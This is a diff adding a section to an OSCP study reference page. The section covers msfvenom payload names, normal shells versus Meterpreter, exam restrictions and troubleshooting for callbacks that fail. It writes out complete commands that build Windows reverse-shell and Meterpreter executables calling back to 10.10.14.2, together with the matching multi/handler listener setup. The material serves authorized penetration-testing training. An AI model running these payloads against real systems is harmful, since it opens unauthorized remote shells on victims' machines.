@@ -197,6 +197,56 @@ Allowed against all targets:
 
 Meterpreter itself remains limited to the one selected target.
 </code></pre>
+<h3>msfvenom -p, normal shell vs Meterpreter — OSCP decision and handler matching</h3>
+<p><strong>Important:</strong> <code>-p</code> in <code>msfvenom</code> means <strong>payload</strong>, not Meterpreter. <code>-f exe</code> selects the executable output format; <code>-o shell.exe</code> selects the output file. Generating an EXE does <strong>not</strong> launch a listener or open a session. <code>msfconsole -q</code> merely starts the console quietly (without the banner).</p>
+<p><strong>Default OSCP choice:</strong> use a normal command shell for manual enumeration, evidence collection and privilege escalation. Meterpreter provides Metasploit features such as built-in upload/download, process interactions and compatible post modules, but is <strong>restricted to one selected exam target machine</strong>. The rule is about <em>one machine, not one session</em>: multiple uses/sessions on that same machine are allowed. A failed restricted attempt still locks your one-machine choice; never try Meterpreter or Metasploit Auxiliary/Exploit/Post on a second machine.</p>
+<table><thead><tr><th>Windows x64 payload name</th><th>Session / staging</th><th>OSCP guidance</th></tr></thead><tbody>
+<tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>Normal command shell, stageless</td><td>Default manual shell; permitted with <code>msfvenom</code> + <code>multi/handler</code> across targets</td></tr>
+<tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>Normal command shell, staged</td><td>Match this exact staged name in the handler</td></tr>
+<tr><td><code>windows/x64/meterpreter/reverse_tcp</code></td><td>Meterpreter, staged</td><td><strong>Only on the one selected target</strong></td></tr>
+<tr><td><code>windows/x64/meterpreter_reverse_tcp</code></td><td>Meterpreter, stageless</td><td><strong>Only on the one selected target</strong></td></tr>
+</tbody></table>
+<h4>Recommended: normal shell (no Meterpreter; authorized lab or permitted exam targets)</h4>
+<pre class="ref-code" data-copy-plain="true"><code class="language-bash"># Kali terminal: replace LHOST with your reachable tun0/VPN callback IP.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o shell.exe
+# In another terminal: msfconsole -q
+# Inside msfconsole:
+use exploit/multi/handler
+set PAYLOAD windows/x64/shell_reverse_tcp
+set LHOST 10.10.14.2
+set LPORT 4444
+set ExitOnSession false
+run -j
+jobs -l
+sessions -l</code></pre>
+<h4>Meterpreter example — ONLY after choosing your single OSCP machine</h4>
+<pre class="ref-code" data-copy-plain="true"><code class="language-bash"># Only for an authorized lab / the ONE selected OSCP exam target.
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4445 -f exe -o met.exe
+# In msfconsole, the handler MUST match the payload exactly:
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.2
+set LPORT 4445
+set ExitOnSession false
+run -j
+jobs -l
+sessions -l</code></pre>
+<p><strong>Payload matching is mandatory:</strong> a file built as <code>windows/x64/meterpreter/reverse_tcp</code> must <strong>not</strong> use a <code>windows/x64/shell_reverse_tcp</code> handler. Also match the architecture, staged/stageless name, <code>LHOST</code> and <code>LPORT</code>. Do not expect a Meterpreter callback to work with <code>nc</code> or a normal-shell handler.</p>
+<h4>No session / session opens then immediately closes — fast checks</h4>
+<pre class="ref-code" data-copy-plain="true"><code class="language-text">1. msfvenom only CREATES a payload file; it does not execute it.
+2. Handler PAYLOAD must equal the msfvenom -p payload (including / versus _).
+3. Handler LHOST/LPORT must match the payload callback; verify tun0 address.
+4. jobs -l lists handler jobs; sessions -l lists established sessions.
+5. "Exploit running as background job" + "no session was created"
+   immediately after run -j does NOT prove a handler failure.
+6. "Started reverse TCP handler" means the listener bound, NOT that a session is alive.
+7. Repeated "Command shell session N closed" means those sessions ended;
+   a mismatched handler, exited/crashed process or security control may explain it.
+8. ExitOnSession false keeps the HANDLER listening for future connections;
+   it does NOT keep an individual shell alive.
+9. If using port 445, check for a local SMB listener conflict: sudo ss -lntp | grep ':445'
+10. Use the target's console/process and security logs to confirm execution and errors.</code></pre>
+<p><strong>OffSec policy (verify before your exam):</strong> <code>msfvenom</code> and <code>exploit/multi/handler</code> can be used on all target machines, <em>except</em> that the Meterpreter payload is one-target-only. Metasploit Auxiliary/Exploit/Post modules are also one-target-only, even using <code>check</code>; Metasploit pivoting is not allowed. <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide" target="_blank" rel="noopener noreferrer">Official OSCP+ Exam Guide</a> · <a href="https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ" target="_blank" rel="noopener noreferrer">OSCP+ Exam FAQ</a>. Reviewed 2026-10-20.</p>
 <h3>Metasploit multi/handler — keep the listener running (ExitOnSession + run -j)</h3>
 <p><strong>Use for:</strong> a reverse-shell payload that may call back more than once (for example after reconnecting), without restarting the same handler. These commands belong <strong>inside msfconsole</strong>, not the Kali Bash prompt. <code>run -j</code> runs the handler as a background job; <code>set ExitOnSession false</code> keeps it listening after a session connects. Neither option changes the OSCP restrictions above.</p>
 <pre class="ref-code"><code class="language-text"># Start msfconsole -q in a separate Kali terminal, then:
